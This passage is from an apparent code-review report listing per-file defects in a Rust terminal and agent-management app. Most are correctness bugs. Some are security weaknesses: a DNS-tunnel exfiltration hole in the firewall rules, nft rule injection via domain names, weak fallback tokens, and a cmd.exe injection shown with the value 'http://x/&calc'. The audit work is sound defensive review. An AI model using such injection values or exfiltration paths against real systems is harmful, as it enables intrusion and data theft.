stated invariant is simply not enforced; lib.rs:697-709 kill_tab_pgroup sends TERM and KILL back to back in the same loop with no wait between them, so the TERM is decorative: claude is SIGKILLed microseconds later and never flushes its session/transcript — the graceful half of the shutdown does not exist; lib.rs:1093-1115 try_acquire_single_instance_lock returns TRUE (acquired) when create_dir_all or open fails, so a read-only or full state dir silently permits a second instance — and that is exactly the precondition under which agent_reaper.rs (single unscoped agent_procs.json) has the second instance SIGKILL the first ones live agents; the INSTANCE_LOCK.set result is also discarded, so a second call in the same process drops the File and RELEASES the fs2 lock while still returning true; lib.rs:1794-1815 read_or_mint_token has a mint race (two processes each mint, last write wins, the loser keeps a cached OnceLock token that no longer matches the file and every later auth fails until restart) and writes the secret with fs::write BEFORE chmod 0600, leaving a umask-wide window where relay.token / remote.token is world-readable; lib.rs:308-323 refresh_folder_styles gates on mtime equality only — a second write inside the same mtime granularity (or a restore that resets mtime backwards) is never picked up, and the whole preferences file is reloaded through load_preferences, which returns Preferences::default() on any parse error (:3460-3474), so a momentarily-half-written preferences.json silently wipes the in-process folder styles; lib.rs:494-495+487-493 minimal_pty_env drops any kept var whose value is empty, so an intentionally empty LANG or TZ is silently replaced by the parent-less default rather than being passed through; lib.rs:540-555 clear_env_shell_command builds env -i K=V pairs from a HashMap, i.e. in NON-DETERMINISTIC order, and does not reject a key containing = or a newline — a user clear_env_vars entry like "A=B=C" or one with an embedded newline is passed to env(1) verbatim; lib.rs:717-724 api_url_for_local_clients takes the text after the LAST colon, so a bind spec with no port (0.0.0.0) or an IPv6 literal without a port silently yields DEFAULT_API_PORT and every in-tab tool is handed a URL pointing at the wrong port

### `src/locale.rs`

locale.rs:339-346 detect_lang gets POSIX locale precedence wrong: the loop only RETURNS when a var starts with 'fr', so a var that is set to something else does not stop the search — LC_ALL=en_US.UTF-8 with LANG=fr_FR.UTF-8 yields French even though LC_ALL is defined to override everything. The first var that is SET must decide, not the first that happens to match; locale.rs:342 starts_with(\"fr\") over-matches the language subtag — fry_NL (West Frisian), frr (North Frisian), frp (Arpitan) all get the French UI; the check should compare the subtag up to the first '_', '.' or '@'; locale.rs:339 LANGUAGE is a COLON-SEPARATED priority list (LANGUAGE=de:fr:en), not a locale — treating it as a scalar means only the first entry is ever consulted, so a user whose fallback chain is de:fr silently gets English while 'frr:en' wrongly gets French; locale.rs:340 env::var returns Ok(\"\") for a set-but-empty var, which POSIX says must be treated as unset — here LC_ALL=\"\" is skipped only by accident (it doesn't start with 'fr'), and would become a real bug the moment the loop is fixed to stop on the first set var; app.rs:883-885 + app.rs:5962-5963 hold the only Lang<->\"en\"/\"fr\" string mapping, duplicated and OUTSIDE the module that owns the enum, and the parse side uses a  wildcard — so adding a Lang variant compiles clean and silently falls back to detect_lang() for the new code; locale.rs has Lang::ALL for iteration but no code()/from_code(), which is where that pair belongs; locale.rs:26 the unconditional #[allow(dead_code)] on Strings (on top of the module-level cfg_attr at :7) permanently suppresses unused-field warnings in GUI builds too, so strings dropped from the UI are never flagged and the struct only grows — locale.rs:28-29 terminal and terminal_n are already identical in both languages, a plural/numbered variant that was never differentiated; locale.rs:374-378 detect_lang_defaults_to_en asserts nothing () despite its name promising the default, so none of the precedence logic above has any coverage; locale.rs:286+333 French uses a plain ASCII space before ':' ('Renommer l'onglet :', 'Test du point d'accès : OK') where French typography needs a narrow no-break space — the plain space permits a line break before the colon; locale.rs:304 toggle_hotkeys EN 'Toggle hotkeys' vs FR 'Raccourcis d'affichage' are not the same thing (verb phrase vs noun label)

### `src/log_ring.rs`

log_ring.rs:5-15+88-90 the 'always-on ring' is not on in the GUI: install() is only reached from lib.rs:1027, and init_gui_file_logging bails at lib.rs:1008 when resolve_log_filter() returns None — so on a desktop instance with no configured filter (the default) no logger is ever installed, the ring stays permanently empty, and GET /logs (api.rs:1883) plus 'tab-atelier logs' return an empty list with no explanation; headless.rs:794-804 gets this right by always building a logger and always installing, so the two binaries disagree on the module's central claim, and it fails in exactly the 'misbehaving right now' case the doc at :7-11 was written for; log_ring.rs:129-133 install() swallows the already-installed case with no return value, so neither caller can warn — a stray env_logger::init() anywhere earlier silently disables /logs for the process lifetime with zero diagnostic (returning bool or Result would cost nothing); log_ring.rs:102-104 enabled() returns true for anything at RING_LEVEL or below regardless of the inner filter, which changes the meaning of log_enabled!() for every call site: code that guards an expensive Debug dump behind log_enabled!(Level::Info) now always pays for it even though :107 correctly suppresses the output — the doc at :87-90 promises existing behaviour is 'intact', which holds for what gets printed but not for what gets computed; log_ring.rs:115 record.args().to_string() fully materialises the message BEFORE clamp_msg sees it, so MAX_MSG bounds retention only — a runaway Debug dump still allocates its full size (and clamp_msg then walks it twice, chars().count() at :77 then chars().take() at :80), which is not what :24 'a runaway Debug dump can't blow the ring's memory' implies to a reader; log_ring.rs:114 target is pushed unclamped, unlike msg — fine for module paths but not for any log!(target: <dynamic>) call site; log_ring.rs:57-61 tail() clones up to 500 Lines (worst case ~4 MB with MAX_MSG at 2000 chars) while holding the single global mutex that every log! call in the process contends on, so a GET /logs?lines=500 stalls all logging threads for the duration; the same 4 MB worst case makes the ':20-22 rounding error next to a tab's scrollback' claim optimistic; log_ring.rs:48 uses len() == CAPACITY rather than >=, which is correct only because push is the sole growth path — a defensive >= costs nothing; tests cover only push/tail/clamp_msg: RingLogger's log/enabled/flush and install() — i.e. the entire wrapping layer where the enabled() semantics change and the install race live — have no test at all

### `src/main.rs`

main.rs:64 vs 68-77 the READ_ONLY / claude-only / relay globals are stored AFTER cli::dispatch::dispatch(), which process::exits inside (dispatch.rs:758-762) — so 'tab-atelier --read-only <any subcommand>' parses happily and runs that subcommand with read_only() still false; the flag is a top-level global on the shared Cli, and lib.rs:92-94 documents read-only as 'never writes any persisted state', which is simply untrue for every one of the subcommand paths; --claude-only and --relay are silently dropped the same way; main.rs:46 + app.rs:6798 the clap migration celebrated in the comment at :28-36 ('no longer silently launching the GUI on a typo') makes from_arg_matches exit 2 on any flag not in the Cli struct, and --check is NOT in that struct (dispatch.rs only has check_crypto) — so the raw std::env::args scan at app.rs:6798 and the whole run_check() path are now unreachable in this binary; main.rs:88-90 ctrlc::set_handler's Result is discarded, so if installation fails Ctrl-C keeps the default disposition and kills the GUI without the shutdown flush, with no warning; and when it succeeds the handler only sets a flag, so a wedged gpui loop can no longer be Ctrl-C'd at all — there is no second-Ctrl-C escape hatch, the user has to SIGKILL; main.rs:79 --read-only opts out of the single-instance lock entirely, so any number of read-only instances can run beside a normal one and the 'never writes' invariant rests wholly on every write path remembering to call read_only() (lib.rs:98) — a global with no compile-time enforcement and no test asserting a read-only instance leaves disk untouched; main.rs:50-55 --check-crypto exits(0) before dispatch, so it silently swallows any subcommand on the same line, and it binds the ServerConfig to _config and drops it immediately, proving only that the builder did not panic — it never resolves a cert, which is the part that actually breaks; main.rs:26 install_rustls_provider() runs unconditionally on every invocation including purely local subcommands (log, tasks, note), and its failure is swallowed inside (lib.rs:1090 let _ =), so a genuinely failed install still surfaces later as exactly the panic the comment at :21-26 says this prevents; main.rs:64-66 dispatch() returning true is handled by a bare return that exits 0 with no GUI and no message — the comment calls it unreachable, so if that contract ever changes the failure mode is a silent success; app.rs:6794 file logging is initialised inside app::run, i.e. after clap parsing, --check-crypto, dispatch and the single-instance-lock failure path, so nothing main.rs does is ever logged and the 'another instance is already running' exit at :79-86 leaves no trace in the log file; main.rs has no tests at all, and the flag->global->lock ordering here is precisely where the first finding lives — dispatch.rs:768-770 shows the author already knows the split-out-the-exit trick, it just was not applied to main

### `src/net_meter.rs`

6 findings; top: descendants() (net_meter.rs:115) has no visited set but its input is a racy non-atomic /proc scan, so a cycle grows the Vec unbounded (hang+OOM on the meter thread); roots are never checked live, and exited tabs linger until the user answers a dialog, so a recycled pid attributes a stranger's sockets to a tab; pub count_connections has ZERO callers - 3 of the 7 tests cover a function nothing runs while the shipped filter is duplicated inline at :150

### `src/net_nft.rs`

net_nft.rs:97-98 the CIDR-allowlist ruleset() accepts udp/tcp dport 53 to ANY destination, so a confined tab can reach any host on :53 worldwide — a ready-made DNS-tunnel exfil/C2 channel; domain_ruleset() scoped exactly this hole to the host nameservers and its doc (:200-203) claims 'arbitrary UDP-to-:53 exfil doesn't' work, but ruleset() was never updated, so plain allowlist tabs still have the hole the docs say is closed; net_nft.rs:190-193+295-301 apply_block/apply_domain/apply_meter return a #[must_use] bool but log NOTHING on failure (unlike apply(), :386-393) and headless.rs:584 uses it as  whose result only feeds an unused  — when the daemon IS privileged and nft rejects/misses the block ruleset, net_off_via_bwrap is false (:620 ) so the tab spawns with NO netns fallback and NO nft table: a tab the UI shows as net-off has full internet, with not one log line; same shape for apply_domain (a false there also short-circuits the resolver spawn, so a domain-allowlist tab silently runs unconfined); net_nft.rs:47-57 the doc claims collisions are impossible because tab ids are UUIDs, but table_name maps every non-alnum char to '_', so 'a/b', 'a-b' and 'a b' all collide on tabatelier_a_b — any non-UUID id (the CLI/API tab-id path, tests already pass 'a/b c') makes one tab's apply()-teardown delete another tab's confinement, and read_counters_all/counters_key mis-attribute bytes the same way; there is also no length cap, so a long id yields a name nft refuses (NFT_NAME_MAXLEN) and apply silently returns false; net_nft.rs:546-548 run_nft_stdin returns Err from write_all (EPIPE when nft exits early) without ever child.wait()ing — std Child's Drop does not reap, so every such failure leaks a zombie nft in a long-lived daemon; net_nft.rs:319-328+338-353 allow_element strips only '"' and '\\' and the comment says the domain is 'already validated against the allowlist', but net_policy::push_domain (:233-252) only trims/lowercases — an interior newline survives and add_allow_ips writes each element with writeln! into a script fed to root's , i.e. arbitrary nft statement injection for anyone who can set a tab's allowlist domains; net_nft.rs:348-352 the batch fallback re-forks one nft per element, so a batch that fails for a PERMISSION reason (not one bad element) reproduces exactly the 40-120-spawns-per-cycle storm the batch was added to kill, every refresh, forever; net_nft.rs:523-533 teardown still deletes '{table}_nat' although nothing has created a _nat table since the :53-redirect was ripped — a guaranteed-failing extra fork on every apply* and every tab exit; net_nft.rs:462-481 fold_rule_counter ASSIGNS (slot.0 = bytes) rather than accumulating, and every apply* tears the table down first, so counters restart at 0 on any policy change or respawn while headless.rs:1377 assigns tab.tx_bytes straight from it — displayed egress jumps backwards, and a second rule ever added to chain out would silently overwrite the total; net_nft.rs:96/174/235  in the confine chain means switching a tab open->net-off leaves every already-established connection alive: policy changes only apply to new flows, and nothing kills the conntrack entries; net_nft.rs:95/173  in every mode (incl. net-off) leaves a 'no internet' tab full access to every localhost service — the daemon API, databases, other tabs' dev servers

### `src/pet.rs`

pet.rs:140-156+235-238 named-id capture (walk/fall/drag/scream/eat) happens BEFORE the `frames.is_empty() -> continue`, so a named animation with no <frame> children yields a def.start/eat/fall/grabbed id absent from `anims`; tick() then hits the `else { return }` at :362 (or the eating branch's silent None at :351) and the pet is frozen forever — respawn() at :327 re-sets the same dangling id, so nothing recovers it; pet.rs:871-874 PetOverlay::rand_u32 returns the raw LCG and callers take `% len` (:897 summon species, :926 grazer pick, :990 grass ledge) — LCG low bits have tiny periods (bit0 period 2), so with 2 or 4 installed pets/ledges the choice strictly alternates instead of being random (Pet::rand_100 :338 correctly uses >>24; this one does not); pet.rs:948-969 tab_ledge_canvas clears the shared ledge Vec only when `index == 0` paints — if tab 0 is ever culled/not painted (scrolled, zero tabs, reordered) every frame appends without clearing, so `ledges` grows unbounded (memory + O(n) surface scans per pet per step); pet.rs:892-902 summon() calls list_pets() on every click and list_pets :726 does read_to_string on every pet XML (~1 MB each) despite the doc at :709-710 claiming it 'reads only the name, not the whole document' — spawn_grazer :913 caches, summon does not, so each summon click does full blocking disk reads on the UI thread; pet.rs:338-341 rand_100 = (rng>>24)%100 is modulo-biased over 256 values: 0..=55 occur 3/256, 56..=99 occur 2/256, so every XML probability is inflated (WALK_STICK 82 fires ~86%, a probability=50 next fires ~54%) — animation weights don't match the eSheep data; pet.rs:365-377 tick subtracts at most 8*interval_ms but never clamps the remainder when the step cap trips, so with a short interval (parse allows down to 1.0 ms at :217) accum_ms grows ~192 ms per frame without bound and the pet runs permanently pinned at 8 steps/frame with an ever-growing f32 that eventually loses precision; pet.rs:661-669 current_tile does frame%tilesx / frame/tilesx with no bound against tilesx*tilesy — a frame id past the grid gives a row offset outside the PNG and the sprite renders blank, silently, with no validation at parse time; pet.rs:751-756 load_pet picks the asset dir by <id>.xml presence alone then requires <id>.png in that same dir, so a dir holding only the XML makes the load fail outright instead of falling through to the second dir that has both; pet.rs:1155-1187 the drag catcher only clears self.drag on its own mouse-up — a lost mouse-up (window blur/focus loss, pointer grab break) leaves dragging=true forever, permanently freezing that pet's physics with no timeout or escape path

### `src/platform/linux.rs`

linux.rs:20-26+39-45 XDG_STATE_HOME/XDG_CONFIG_HOME are taken verbatim from env::var, which returns Ok("") for a set-but-empty var — XDG_CONFIG_HOME= makes config_dir() return "" so preferences.json and the API master token resolve RELATIVE to the process cwd; the XDG spec says empty must be treated as unset, and this quietly moves secrets out of ~/.config; linux.rs:22+34+41+58 HOME-unset falls back to /tmp, so with no HOME (hardened systemd unit, `sudo -u tab-atelier` without -H) tabs.json/preferences.json/token land in world-writable /tmp where any local user can pre-create or symlink them — a silent fallback for paths holding auth material should be fatal or read the passwd db, not /tmp; linux.rs:33-36 config_base_dir() hardcodes $HOME/.local and ignores XDG entirely while its sibling state_base_dir() honours XDG_STATE_HOME — so setting XDG_STATE_HOME splits tabs.json from the per-tab state it indexes, and the two config_* functions return unrelated roots ($HOME/.local vs $HOME/.config) despite the near-identical names; linux.rs:111-122 the parent walk starts at focus.focus without special-casing the reserved values None(0)/PointerRoot(1), so with no window focused query_tree(0) fails and the user gets an opaque 'query_tree: BadWindow' instead of 'no focused window'; the loop also has no depth bound and only exits on parent==root||0, so a focus on a second screen's root subtree walks the whole chain; linux.rs:124-153 geometry is read from the WINDOW but get_image is issued against root at translated coords — a window extending past a screen edge (negative dst_x/dst_y or x+w>screen width, routine for maximised/off-screen windows) makes the rect out of bounds and X returns BadMatch, failing the whole capture instead of clamping to the screen; linux.rs:205-207 when x11rb::connect fails, grab_hotkeys returns a HotkeyHandle whose receiver was dropped, so every later update_keys/suspend/resume is a silently-swallowed `let _ = send()` — the caller has no way to learn hotkeys are dead; linux.rs:283 same failure mode at runtime: any poll_for_event error breaks the thread permanently with no log and no restart, hotkeys just stop working forever; linux.rs:271-282 the event loop busy-polls at 16ms (~62 wakeups/s) for the process lifetime even while suspended, purely because try_recv on the command channel cannot be combined with a blocking wait_for_event; linux.rs:212-217 the modifier masks hardcode NumLock==Mod2 rather than querying the modifier map, and omit ScrollLock — hotkeys silently fail on layouts that map numlock elsewhere; linux.rs:80-95 random_bytes calls std::process::exit(1) from library code, so a /dev/urandom failure while the API thread mints a share token kills the GUI mid-frame skipping every destructor and the tabs.json persist, and makes the path untestable; linux.rs:50-56 pictures_dir spawns xdg-user-dir synchronously (blocking whatever thread calls it) and never checks o.status.success(), trusting stdout of a failed process

### `src/platform/windows.rs`

windows.rs:95-105 REINSTATES the predictable-token hole that linux.rs:72-95 exists to document as removed — its comment says 'Mirror linux.rs's degraded fallback so we never hard-fail', but linux.rs has no such fallback any more: it exits(1) precisely because 'a predictable token is worse than a crash'. On Windows a BCryptGenRandom failure instead mints the API master token and per-tab share tokens from SystemTime nanos, brute-forceable by anyone who can estimate the host clock. Worse, seed.to_le_bytes() is a u128 whose top 8 bytes are always zero for any current timestamp and it is .cycle()d, so a 32-byte token is the same ~8 bytes of low-nanos repeated four times; the comment is stale and the behaviour is the vulnerability; windows.rs:136-143 and :158-168 pass an untrusted string to cmd.exe: Rust's Command quotes arguments for the CommandLineToArgvW convention, which cmd.exe does NOT follow, so a URL or path containing and-sign, pipe, caret, quote or a %VAR% is re-parsed by cmd's own parser — 'http://x/&calc' runs calc. std documents passing untrusted args through cmd.exe as unsafe (the CVE-2024-24576 class), and these URLs come from clicked OSC-8 links in terminal output, i.e. straight from agent-controlled text; windows.rs:39-51 env::var returns Ok(empty) for a set-but-empty variable, so APPDATA= makes config_dir() the RELATIVE path 'tab-atelier' and the signing key + relay secret are written next to whatever the process cwd happens to be; with USERPROFILE also unset, user_profile() falls back to temp_dir(), and under a service account that is C:\Windows\Temp, writable by every authenticated user — identity material must not have a silent fallback; windows.rs:59-68 config_base_dir() returns %APPDATA% and config_dir() returns %APPDATA%\tab-atelier, and the module doc says callers join APP_DIR to config_base_dir — so the two resolve to the SAME directory. On Linux they are deliberately distinct (~/.config vs ~/.local) with linux.rs:29-32 stating the separation is what stops a bad write to one from corrupting the other; that isolation silently collapses on Windows and tabs.json/preferences.json now share a directory with the TLS key and tokens; windows.rs:49-61 tabs.json, preferences.json AND (per the module doc) the signing key and relay secret all land in the ROAMING profile, so on a domain-joined machine private key material is copied to the profile share at every logoff — %APPDATA% is the wrong side of the roaming split for secrets; windows.rs:81-87 process_cwd always returns None and the doc claims callers treat that as 'unknown cwd', but api/files.rs turns a missing cwd into a hard 400 'tab has no known cwd' — so every file upload/download route is permanently broken on Windows rather than degraded; windows.rs:200-234 the whole test module is inside a Windows-only file, so none of it (including random_bytes_different_calls, which would fail outright if the nanos fallback ever engaged twice in one tick) ever runs in this project's Linux CI — the fallback path has zero coverage anywhere

### `src/remote.rs`

11 findings: Activate posts to a route the daemon deleted (405); output/input addressed by stale remote_index though /tabs/by-id works -> bytes+keystrokes can hit the wrong tab; module doc claims cert pinning but code does disable_verification; sleep(backoff) up to 30s blocks Shutdown/input; missing X-Output-Length silently re-appends full scrollback every 250ms; malformed /tabs rows default to index 0/empty id; output errors unthrottled+unbounded mpsc; poll deadlines drift to zero-wait spin; Reconnecting.since restamped + Connecting never constructed; wrong REQUEST_TIMEOUT rationale; zero tests

### `src/schedule.rs`

schedule.rs:185-187 next_change_at maps the next LOCAL transition back through tz.from_local_datetime().earliest(), which returns None for a NONEXISTENT local time (DST spring-forward gap) — .earliest() only disambiguates the fall-back/Ambiguous case, so the comment at 181-184 claiming it handles 'even when the wall clock skipped over it' is factually inverted; a rule with a boundary inside the gap (Europe/Paris 02:00-02:59 on transition day, e.g. an overnight 'Mo-Fr 09:00-02:00') yields None; schedule.rs:223 verdict_now then treats next_change==None as 'valid forever' (is_none_or), so that thread's cached verdict FREEZES permanently at whatever is_open it had — the tab stays locked (or stays unlocked) indefinitely, and nothing distinguishes 'no further transitions' from 'conversion failed'; schedule.rs:457 the dst_spring_forward test discards the result (let _ = ...) so it cannot catch this; schedule.rs:40-42 PARSED_RULE_CACHE is an UNBOUNDED thread-local HashMap keyed by rule string — no cap and no eviction, unlike VERDICT_CACHE which is capped at 64 (line 236) with a comment acknowledging exactly this risk; every rule string ever seen (incl. schedules since deleted via POST /tabs/by-id/x/schedule) is retained for the life of each thread, ×N tokio blocking-pool threads since the caches are thread-local; schedule.rs:163-169 contradictory failure policy 5 lines apart: unparseable rule fails OPEN (return true) while RuleKind::Unknown fails CLOSED, yet the comment at 166-168 states 'fail closed on ambiguity'; schedule.rs:63-69 TabSchedule derives Deserialize with pub fields and NO validation hook, so only the API path (api/schedule.rs:44) goes through new() — a tabs.json with a bad tz silently degrades to UTC (line 126 unwrap_or(UTC)) and a bad rule silently degrades to always-open (line 163), both with zero log/warn, so a user's off-hours lock just stops working with no signal

### `src/screenshot.rs`

screenshot.rs:115-127 take_screenshot_tab CROPS THE WRONG END: it keeps img.data[..crop_h*stride], i.e. the FIRST crop_h rows. X11 returns rows top-first and the tab bar is at the TOP, so this keeps the tab bar and chops tab_bar_height rows off the BOTTOM of the terminal — the exact opposite of what the function is for. Removing a top bar needs the slice to start at tab_bar_height*src_stride (its own error string at :126, 'crop offset exceeds image data', hints an offset was meant). No test touches this path, which is why it survives; screenshot.rs:17-22 timestamp() has ONE-SECOND resolution and screenshot.rs:40 unconditionally remove_file's the destination first, so two captures of the same tab within the same second silently destroy the first — the UI reports 'Saved' both times and only one file exists. The remove+create_new pair is also a race in a shared screenshots dir (reachable when platform::linux's HOME fallback puts pictures_dir under /tmp): an attacker planting a symlink between the two calls turns the capture into an EEXIST failure; O_EXCL blocks the redirect the comment worries about, but the unconditional delete is real data loss on any name collision; screenshot.rs:61 the bytes-per-pixel probe is a GUESS from buffer length (bgra.len() >= w*h*4) and the true value is thrown away upstream — platform/linux.rs:155-159 passes reply.data raw and discards reply.depth. X11 Z_PIXMAP scanlines are padded to the server's scanline unit, so on any display that is not 32bpp-unpadded the assumed stride of w*bpp is wrong and every row shears diagonally; the same probe is written twice with DIFFERENT integer widths — u32 at :61 vs usize at :116 — so the two disagree for large images; screenshot.rs:27-32 all header arithmetic is u32 (row_padded*h, 54+pixel_data_size) with no checked/saturating math: it wraps silently in release, writing a bogus file_size into the BMP header for an oversized capture, and panics in debug; screenshot.rs:72-76 when the buffer is short the loop substitutes BLACK pixels instead of failing, so a truncated capture is written as a partly-black image and reported as a success; screenshot.rs:25+48-59 the writer assumes little-endian BGRA ordering (BMP 24-bit is BGR) without checking the X server's image-byte-order — red and blue come out swapped on an MSBFirst server; screenshot.rs:85-96 sanitize_filename uses Unicode is_alphanumeric and imposes NO length cap, and tab names are user-settable and unbounded, so a long or multi-byte name (its own test asserts CJK survives) overflows NAME_MAX and surfaces as a raw 'create ...: File name too long'; an empty name yields the double-dash 'tab-atelier--<ts>.bmp'; screenshot.rs:101+130 create_dir_all's error is discarded, so a mkdir failure is re-reported later as a confusing 'create <file>: No such file or directory' from write_bmp; screenshot.rs:20 unwrap_or_default on a pre-epoch clock makes timestamp() return '0' for every capture, collapsing all filenames onto one name that then overwrites itself

### `src/sweep.rs`

10 findings: sweep ignores --read-only (app.rs:1438/headless.rs:1059 spawn unconditionally) so a read-only instance shells out to sources, appends to the shared blackboard and gossips - and read-only is meant to run BESIDE a normal instance; fleet_sweep_gossip:true is a bare bool that bidirectionally gossips with EVERY remote_endpoint (gossip.rs:137-140, exchange pulls+merges their board) with no per-peer opt-in; a panic in once() kills the loop permanently and silently (handle dropped, quiet sweeps log nothing); fleet_sweep_minutes is the only knob not re-read per tick and 0 never stops the thread; first sweep waits a full period so a daemon restarted more often than the period never sweeps; blackboard append failures filed under source_errors; LCOV read with no staleness/mtime check and can be read mid-write; prefs loaded twice per sweep; Preferences::default() cooldown is 0->1d vs serde default 30d; the off-unless-asked test asserts on Preferences::default() then calls spawn_if_configured() which reads the real user config, so on a machine with the sweep enabled cargo test spawns a live sweeping thread

### `src/term_export.rs`

term_export.rs:213-233 and 377-397 the flag->SGR map covers only BOLD/DIM/ITALIC/UNDERLINE/INVERSE/HIDDEN/STRIKEOUT — alacritty CellFlags also carries DOUBLE_UNDERLINE, UNDERCURL, DOTTED_UNDERLINE, DASHED_UNDERLINE (SGR 4:2/4:3/4:4/4:5, emitted by nvim/fish/rustc for error+spell underlines) and none are re-emitted, so that styling is silently DROPPED from every export; worse, those flags still take part in the cell.flags != cur_flags diff (188/351) and are stored into cur_flags (244/407), so line 253/414 then pushes a trailing ESC[0m closing a style that was never opened; term_export.rs:188/244/253 (and 351/407/414) the same bug class for the NON-SGR flags: WRAPLINE / WIDE_CHAR / WIDE_CHAR_SPACER / LEADING_WIDE_CHAR_SPACER live in the same bitset and are compared+stored as if they were attributes, so every soft-wrapped row's last cell and every CJK/emoji cell needlessly enters the SGR branch and every wrap-continued row gets a spurious ESC[0m glued into the MIDDLE of the joined logical line (the test at 572-573 documents the symptom and shrugs); cur_flags should be masked to the SGR-relevant subset once; term_export.rs:274/282 the returned cursor column is a GRID-column count (prefix_cols += cols) while the emitted logical line has SGR escapes inlined and WIDE_CHAR_SPACER cells skipped (178) — for any line containing wide chars each char eats 2 grid cols but 1 emitted char, so the reported col overshoots the joined line and cannot be used for positioning; term_export.rs:159-161 max_lines below the screen height is silently ignored: want.saturating_sub(screen) makes extra=0 and the loop still walks 0..screen, so term_to_ansi_lines(term, Some(3)) on a 24-row grid returns 24 lines — callers pass 200/2000 today so it is latent, and api/output.rs:115 works around it by re-trimming the rendered payload; term_export.rs:172 grid[Column(cols - 1)] underflows if cols==0 (no guard on a degenerate resize); term_export.rs:315-322 the doc claims cursor_dump is None when the cursor sits above the window, but grid.cursor.point.line is always screen-relative (0..screen) and start_row<=0, so the guard is always true and the None branch is unreachable; term_export.rs:331 String::with_capacity(cols*want*2) eagerly allocates ~960 KB per rebuild at want=2000/cols=240 regardless of how empty the scrollback actually is, per tab, on the ~96 ms headless refresh; term_export.rs:299-431 vs 139-291 the two cell walks are ~150 duplicated lines that have ALREADY drifted (push_code(&mut sgr,"0") vs bare sgr.push('0'), closure shape) — equivalent today only by accident, and a fix to one will not reach the other; term_export.rs:279-281 the 'lines is empty while continues_prev' fallback is dead (continues_prev is false on the first row, so lines is never empty there)

### `src/terminal_utils.rs`

terminal_utils.rs:11-23+26 ks.modifiers.platform (Super/Cmd) and .function are NEVER consulted by any arm, so Super+K falls through to 128-140 and returns key_char — a literal 'k' typed into the PTY; terminal.rs:1740-1810 (the only caller) has no platform guard either, so every unhandled Super chord leaks a character to the shell, and xterm_modifier omits it so Super+Up is byte-identical to a bare Up; terminal_utils.rs:128-146 alt is silently DROPPED whenever ctrl is also held on a letter — ctrl+alt+a returns [0x01] with no ESC prefix, so M-C-a (tmux prefix, emacs/readline bindings) is indistinguishable from plain C-a; same at 97-111 and 144-146; terminal_utils.rs:35-43,94-95 guard order drops modifiers across the literal table: 'enter' if shift wins over if alt (alt+shift+enter loses the ESC), 'backspace' if ctrl wins over if alt (ctrl+alt+bs -> 0x08, alt gone), 'tab' ignores ctrl and alt entirely, 'escape' has no alt arm (alt+esc should be ESC ESC), and 'space' has a ctrl arm but no alt arm so alt+space sends a bare 0x20 instead of ESC 0x20 (M-space = readline set-mark) — every test uses a single modifier (ctrl_alt() is exercised only on arrows, 363-369) so none of this is covered; terminal_utils.rs:142 key.len() == 1 is a BYTE length test, so any non-ASCII single-character key label (é, ü, € on the matching layout) is len 2-3 and falls to 161 -> None: with alt held and key_char absent, Alt+é emits nothing at all instead of ESC+é (the 107/143 as_bytes()[0] indexing is only sound because of that same check); terminal_utils.rs:26 the mode argument is consulted ONLY for APP_CURSOR — TermMode::LINE_FEED_NEW_LINE (LNM) is ignored so Enter always sends bare CR even when the app requested CRLF, and APP_KEYPAD is ignored so numpad keys get no SS3 encoding; terminal_utils.rs:175-177 hsla_eq compares hue LINEARLY on a wrapping 0..1 axis so h=0.999 vs h=0.001 (both red, visually identical) compare unequal, and any NaN channel makes every comparison false — used to skip redundant work, so the cost is spurious repaints; terminal_utils.rs:56-61 the shift-modified home/end CSI forms are unreachable from the GUI: terminal.rs:1765-1795 swallows shift+home/end/pageup/pagedown for scrollback before this function runs, so those arms are dead in the only caller yet still asserted by tests as if live

### `src/theme.rs`

theme.rs:134-157 named_to_hsla collapses Dim*/Bright*Foreground onto the plain slot (DimRed->ansi[1]==Red, DimForeground/BrightForeground->term_fg), so SGR 2 dim text renders identical to normal — de-emphasis from git/systemd/ls is silently lost; theme.rs:152+206 NamedColor::Cursor and OSC-12 index 258 answer term_fg, but the cursor is actually painted as a hardcoded Rgba{0.86,0.86,0.86,a:0.7} (terminal.rs:3178) that ignores the theme entirely — under LIGHT (bg 0xffffff) a 0.86 grey at 70% alpha is near-invisible, and an app querying OSC 12 is told the cursor is black; theme.rs:232 the '_ =>' arm makes color_index_to_rgb answer ANY out-of-range OSC 4 index with the foreground colour instead of declining, so a query for index 300 gets a plausible-looking wrong reply; theme.rs:124-129 with_term_bg tints only term_bg, leaving selection/bg/surface at theme values — DARK.selection is 0x094771, so a tab tinted anywhere near that navy makes mouse selection invisible (no contrast check between tint and selection anywhere); theme.rs:339+341 in the DEFAULT theme TOMORROW_NIGHT_BLUE elevated==bg==0x002451, so popovers/menus have zero elevation contrast and rely entirely on border; theme.rs:346-347 TNB accent 0xbbdaff (pale) vs accent_hover 0x003f8e (dark navy) inverts lightness on hover while the label colour stays fixed (app.rs:4973-4974), and app.rs:4822 pairs sel_bg=accent(pale) with dialog_fg=white -> white-on-pale-blue switcher selection in the default theme; theme.rs:384 LIGHT.danger 0xf5c6cb (pale pink) is the tab attention blink bg (app.rs:3273) over surface 0xf3f3f3 — the bell/attention signal is effectively invisible in the Light theme, whereas dark themes use 0x5c1010; theme.rs:17+61 Serialize/Deserialize are derived on ThemeName/CursorStyle but never used (prefs round-trip through id()/from_id at app.rs:887-891) — a future serde use would write 'TomorrowNightBlue' where the rest of the codebase expects 'tomorrow-night-blue'; theme.rs:395-435 vs 437-627 tests_palette and tests duplicate all_themes_have_labels/ansi_16_colors_populated/from_id_roundtrip verbatim, both compiled in gui builds

### `src/transcript_compact.rs`

transcript_compact.rs:566-570 validate() pushes 'unparsable line survived' for every record parse() deliberately kept — parse's own contract at :36 and :120 is that unparsable lines are 'kept verbatim, never dropped', so a transcript containing one malformed line makes validate non-empty forever and its documented meaning ('Empty => --resume integrity preserved') reports a compaction fault that the compactor did not cause; that push is also outside the `problems.len() >= 3` cap at :577, so a corrupt file yields an unbounded problems Vec; transcript_compact.rs:157-172 cap_string INFLATES for small caps and reports zero: with cap=16 on a 20-byte value, head+tail is 16 bytes plus the ~28-byte '...[trimmed N bytes]...' marker, so `new` is ~44 bytes, `removed` saturating_subs to 0, and apply :326-331 still swaps the longer string in — tool_cap is a pub field, so any cap below ~40 grows the transcript while stats claim a saving of 0; transcript_compact.rs:321-334 the cap layer replaces `tool_result.content` with `Value::String(serialized_json)` regardless of its original shape — an array content block (the common `[{\"type\":\"text\",...}]` form) is coerced to a string of escaped JSON, and the operation is NOT idempotent: a second apply() over the output re-serializes that string (now with escapes) and can cap it again, nesting a second '[trimmed N bytes]' marker inside the first; transcript_compact.rs:295-339 the block edit does `mem::take(blocks)` and then re-resolves `v.pointer_mut(\"/message/content\")` to write `nb` back — if that second lookup ever fails the taken array is dropped and the record is left with an EMPTY content array, 